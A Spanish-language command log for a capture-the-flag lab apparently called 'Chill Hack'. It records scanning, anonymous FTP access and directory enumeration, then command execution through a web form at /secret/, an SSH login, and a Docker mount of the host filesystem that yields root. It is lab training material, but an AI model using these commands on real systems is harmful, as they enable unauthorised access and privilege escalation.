# REGISTRO DE COMANDOS — LAB-015 CHILL HACK

## Reconocimiento

```bash
sudo nmap -Pn -sV -sC -T4 -p21,22,80 10.65.175.242
sudo nmap -Pn --top-ports 1000 -T4 10.65.175.242
```

## FTP

```bash
curl -sS --user anonymous:anonymous ftp://10.65.175.242/note.txt
curl ftp://10.65.175.242/
```

## Enumeración web

```bash
gobuster dir -u http://10.65.175.242 -w /usr/share/wordlists/dirb/common.txt
curl -sS -X POST -d 'command=id' http://10.65.175.242/secret/
curl -sS -X POST -d 'command=pwd' http://10.65.175.242/secret/
curl -sS -X POST -d 'command=whoami' http://10.65.175.242/secret/
curl -sS -X POST -d 'command=sudo -l' http://10.65.175.242/secret/
```

## Enumeración de archivos y script

```bash
curl -sS -X POST -d 'command=find /home -maxdepth 3 -type f' http://10.65.175.242/secret/
curl -sS -X POST -d "command=sed -n '1,120p' /home/apaar/.helpline.sh" http://10.65.175.242/secret/
```

## Acceso SSH y verificación

```bash
ssh anurodh@10.65.175.242
id
whoami
```

No se registra contraseña.

## Escalada Docker

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
id
whoami
```

No se incluyen los comandos que muestran directamente los valores de las banderas.
